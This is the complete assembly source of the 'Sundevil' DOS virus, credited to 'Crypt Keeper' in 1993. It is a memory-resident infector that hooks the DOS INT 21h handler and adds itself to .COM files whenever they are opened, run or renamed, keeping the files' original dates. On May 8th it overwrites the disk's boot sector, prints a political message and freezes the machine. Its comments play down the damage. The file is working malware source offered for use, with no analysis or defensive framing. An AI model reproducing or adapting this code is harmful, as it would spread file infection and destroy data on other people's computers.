;****************************************************************************
;*                             The Sundevil Virus                           *
;*                          (C)1993 by Crypt Keeper                         *
;****************************************************************************

;Parasitic Resident .COM infector
;Activation Criteria : May 8th of any year (displays message and trashes BSC)

;May 8th, 1990 is the date of the Secret Service searches and busts that were
;conducted as part of Operation Sundevil.  This virus is dedicated to all of
;the victims of this and other federal busts of computer hackers.

;The virus will trash the boot sector of the hard disk on May 8th, and
;display it's message.  This damage isn't too bad, and can be easily
;repaired.

CODE	SEGMENT
	ASSUME CS:CODE,DS:CODE,ES:CODE,SS:CODE

TOPMARK	EQU	$                      ;Top of full viral code

;Equates --------------------------------------------------------------------

VLENGTH	EQU	BOTMARK-TOPMARK        ;Size of virus code
AMTRES	EQU	1000h                  ;Paragraphs from TOM to put virus

;----------------------------------------------------------------------------

ENTRY:	CALL GETDELTA
	NOP
GETDELTA:
	POP BP
	SUB BP,OFFSET(GETDELTA)-1      ;Calculate delta offset

START	PROC NEAR                      ;Startup procedure
	MOV AH,2Ah                     ;Get date
	INT 21h

	CMP DX,0508h                   ;March 8th?
	JE TRIGGER                     ;If so, trigger

	JMP SHORT NO_TRIGGER           ;If not, skip triggering
TRIGGER:
	MOV AH,19h                     ;Get default drive
	INT 21h

	XOR BX,BX                      ;DS:BX points to data to write
	MOV CX,1                       ;Write one sector
	XOR DX,DX                      ;Beginning with sector zero (boot sec)

	INT 26h                        ;Absolute disk write
	POPF                           ;Get flags off stack

	PUSH CS
	POP DS
	LEA DX,[BP+OFFSET(MESSAGE)]    ;Message to display

	MOV AH,9                       ;Print string
	INT 21h

PRTSCR:	INT 05h                        ;Print screen
	JMP SHORT PRTSCR               ;forever

NO_TRIGGER:
	CALL GETPARA                   ;Get total paragraphs in machine
	SUB AX,AMTRES                  ;Get segment where virus code would be
	
	PUSH AX
	POP ES
	MOV CX,ES:RESID
	PUSH CS
	POP ES                         ;Get resident ID word from virus seg
	
	CMP CX,CS:[BP+OFFSET(RESID)]   ;Already resident?
	JNE INSTALL                    ;If not, install it
							
SPAWN:	LEA SI,[BP+OFFSET(SAVBYT)]     ;Offset of saved bytes
	MOV CX,BCLEN                   ;Length of branch code
	MOV DI,100h

	REP MOVSB                      ;Copy original bytes down there

	MOV AX,100h
	PUSH AX
	RET                            ;Jump to original program
INSTALL:
	MOV AX,3521h                   ;Get INT 21h vector
	INT 21h
	
	MOV CS:[BP+OFFSET(I21VECO)],BX
	MOV CS:[BP+OFFSET(I21VECS)],ES ;INT 21h vectors

	CALL GETPARA
	                               ;Get paragraphs in machine
	SUB AX,AMTRES                  ;Amount to remain resident
	PUSH AX

	PUSH AX
	POP ES                         ;Destination segment
	PUSH CS
	POP DS                         ;Source segment
	MOV SI,BP                      ;Delta offset=start of viral code
	XOR DI,DI                      ;Put viral code at 100h in new seg
	MOV CX,VLENGTH                 ;Length of viral code

	REP MOVSB                      ;Move ourselves up there

	POP DS                         ;Segment of interrupt handler
	MOV DX,OFFSET(INTVEC)          ;Offset of interrupt handler
	
	MOV AX,2521h                   ;Set INT 21h vector
	INT 21h
	
	PUSH CS
	POP ES
	PUSH CS
	POP DS                         ;Reset all the segments
	
	JMP SHORT SPAWN                ;Run original program
START	ENDP

;----------------------------------------------------------------------------

  ;This procedure finds the total K of memory in the machine according to
  ;INT 12h

GETPARA	PROC NEAR                      ;Finds number of paragraphs in machine
	INT 12h                        ;Get K in machine

	MOV CX,1024                    ;1024 bytes in a K
	MUL CX                         ;Multiply AX by CX

	MOV CX,16                      ;16 bytes in a segment
	DIV CX                         ;Divide AX and DX by CX

	RET                            ;Return to caller
GETPARA	ENDP

;----------------------------------------------------------------------------

  ;This is the branch code that is written over infected files.

TOP_BC	EQU	$                      ;Top of branch code

BRANCH:	XCHG SI,BP                     ;Infection ID
	DB	0BBh                   ;MOV BX,
VOFFSET	DW	0                      ;Offset of viral code
	PUSH BX
	RET                            ;Jump to virus code

BOT_BC	EQU	$                      ;Bottom of branch code
BCLEN	EQU	BOT_BC-TOP_BC          ;Length of branch code

;Data -----------------------------------------------------------------------

MESSAGE	DB	13,10
	DB	'There is no America.',13,10
	DB	'There is no Democracy.',13,10
	DB	'There is only IBM, ITT, and AT&T.',13,10
	DB	13,10
	DB	'This virus is dedicated to all that have been busted',13,10
	DB	'for computer hacking activities.',13,10
	DB	13,10
	DB	'The SunDevil Virus (C)1993 by Crypt Keeper',13,10
	DB	'[SUNDEVIL]',13,10,'$'

I21VECO	DW	0
I21VECS	DW	0                      ;Original INT 21h vector

CHKBUF	DW	0                      ;Buffer for checking for infection

COM	DB	'COM'                  ;Extension to search for

ORIG_DS	DW	0
ORIG_DX	DW	0                      ;Original DS:DX

SAVBYT	DB	0CDh
	DB	20h                    ;For return to DOS on original file
	DB	BCLEN-2 DUP ('X')

OLDTIME	DW	0
OLDDATE	DW	0                      ;Old file time and date

;----------------------------------------------------------------------------

FUNCTION PROC NEAR                     ;Calls the original INT 21h vector
	PUSHF
	CALL DWORD PTR CS:I21VECO      ;Simulate and Interrupt to INT 21h
	RET
FUNCTION ENDP

;----------------------------------------------------------------------------

INTVEC	PROC NEAR                      ;INT 21h vector
	NOP
	
	CMP AH,3Dh                     ;Open file with handle?
	JE VTRIGGER

	CMP AX,4300h                   ;Get file attributes?
	JE VTRIGGER

	CMP AH,3Eh                     ;Close file with handle?
	JE VTRIGGER

	CMP AH,56h                     ;Rename file?
	JE VTRIGGER

	CMP AX,4B00h                   ;Load and execute program?
	JE VTRIGGER

	CMP AX,4B01h                   ;Load program?
	JE VTRIGGER

	JMP DWORD PTR CS:I21VECO       ;Execute rest of interrupt chain
VTRIGGER:
	PUSH AX
	PUSH BX
	PUSH CX
	PUSH DX
	PUSH SI
	PUSH DI
	PUSH ES
	PUSH DS
	PUSH BP                        ;Save all the registers

	MOV CS:ORIG_DS,DS
	MOV CS:ORIG_DX,DX              ;Save original DS:DX (filename)

	CLD                            ;Clear direction flag

	PUSH DS
	POP ES
	MOV DI,DX                      ;DS:DX => ES:DI

	MOV CX,256                     ;256 maximum length
	MOV AL,'.'                     ;Scan for extension separator

	REPNE SCASB                    ;Scan the filename string

	CMP CX,0                       ;If CX is zero, then none found.
	JNE FILE_FOUND                 ;If found, check for .COM
	
	JMP NO_FILE                    ;If not, end infection

FILE_FOUND:
	MOV CX,3                       ;Three bytes in extension
	PUSH CS
	POP DS
	MOV SI,OFFSET(COM)             ;Is it a .COM file?

SCAN:	LODSB                          ;Load byte of extension
	MOV BL,ES:[DI]
	INC DI                         ;Load byte of filespec
	AND BL,5Fh                     ;Capitalize
	CMP AL,BL                      ;Equal?
	JNE END_SEARCH                 ;If not, end this scan
	DEC CX                         ;De-increment counter
	JMP SHORT SCAN                 ;Loop
END_SEARCH:
	CMP CX,0                       ;Did all three match?
	JE INFECT                      ;If so, infect the file

	JMP NO_FILE                    ;If not, skip it.

INFECT:	MOV DX,CS:ORIG_DS
	MOV DS,DX
	MOV DX,CS:ORIG_DX              ;Original filename locaiton

	MOV AX,3D02h                   ;Open file for READWRITE access
	CALL FUNCTION

	MOV BX,AX

	MOV AX,5700h                   ;Get file date and time
	CALL FUNCTION

	MOV CS:OLDTIME,CX
	MOV CS:OLDDATE,DX              ;Save old file date and time

	MOV CX,2                       ;Read one word
	PUSH CS
	POP DS
	MOV DX,OFFSET(CHKBUF)          ;Check buffer

	MOV AH,3Fh                     ;Read file or device
	CALL FUNCTION

	MOV DX,CS:CHKBUF
	CMP DX,WORD PTR [OFFSET(BRANCH)]  ;Already infected?
	JNE GO_AHEAD                   ;If not, go ahead and infect

	JMP SHORT ENDINF               ;If so, end infection process

GO_AHEAD:
	CALL ZEROPTR                   ;Zero file pointer

	MOV CX,BCLEN                   ;Length of branch code
	MOV DX,OFFSET(SAVBYT)          ;Offset of saved byte buffer

	MOV AH,3Fh                     ;Read file or device
	CALL FUNCTION

	XOR CX,CX
	XOR DX,DX                      ;Move zero bytes

	MOV AX,4202h                   ;Move from end of file
	CALL FUNCTION

	ADD AX,100h
	MOV CS:VOFFSET,AX              ;Set up code offset in branch

	MOV CX,VLENGTH                 ;Length of virus code
	XOR DX,DX                      ;Offset 00h in segment

	MOV AH,40h                     ;Write file or device
	CALL FUNCTION
	
	CALL ZEROPTR                   ;Zero file pointer

	MOV CX,BCLEN                   ;Length of branch code
	MOV DX,OFFSET(BRANCH)          ;Write the branch code

	MOV AH,40h                     ;Write file or device
	CALL FUNCTION

ENDINF:	MOV CX,OLDTIME
	MOV DX,OLDDATE                 ;Old file time and date

	MOV AX,5701h                   ;Set file date and time
	CALL FUNCTION

	MOV AH,3Eh                     ;Close file with handle
	CALL FUNCTION

NO_FILE:
	POP BP
	POP DS
	POP ES
	POP DI
	POP SI
	POP DX
	POP CX
	POP BX
	POP AX                         ;Restore all the registers

	JMP DWORD PTR CS:I21VECO       ;Execute rest of interrupt chain
ZEROPTR:
	XOR CX,CX
	XOR DX,DX                      ;Move zero bytes

	MOV AX,4200h                   ;Move from beginning of file
	CALL FUNCTION
	RET                            ;Return to caller
INTVEC	ENDP

;----------------------------------------------------------------------------

RESID	DW	985Ch                  ;Resident ID

BOTMARK	EQU	$                      ;Bottom of viral code

CODE	ENDS
	END
